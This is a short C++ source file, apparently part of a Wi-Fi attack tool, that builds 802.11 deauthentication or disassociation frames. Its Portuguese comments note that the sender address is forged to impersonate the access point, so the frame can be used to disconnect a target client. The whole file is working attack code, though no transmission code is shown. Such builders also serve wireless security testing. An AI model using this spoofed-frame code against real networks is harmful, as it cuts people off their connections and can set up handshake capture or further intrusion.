#include "deauth_frame_builder.h"
#include <cstring>

void DeauthFrameBuilder::build(const uint8_t targetMac[6], const uint8_t bssid[6],
                                uint16_t reason, uint8_t out[26], uint8_t frameControl0) {
  memset(out, 0, 26);
  out[0] = frameControl0;  // frame control: deauth (0xC0) ou disassoc (0xA0)
  out[1] = 0x00;
  out[2] = 0x00;  out[3] = 0x00;        // duration
  memcpy(&out[4], targetMac, 6);        // addr1: destino
  memcpy(&out[10], bssid, 6);           // addr2: origem (forjado como o AP)
  memcpy(&out[16], bssid, 6);           // addr3: BSSID
  out[22] = 0x00; out[23] = 0x00;       // sequence/fragment
  out[24] = (uint8_t)(reason & 0xFF);   // reason code (little-endian)
  out[25] = (uint8_t)((reason >> 8) & 0xFF);
}
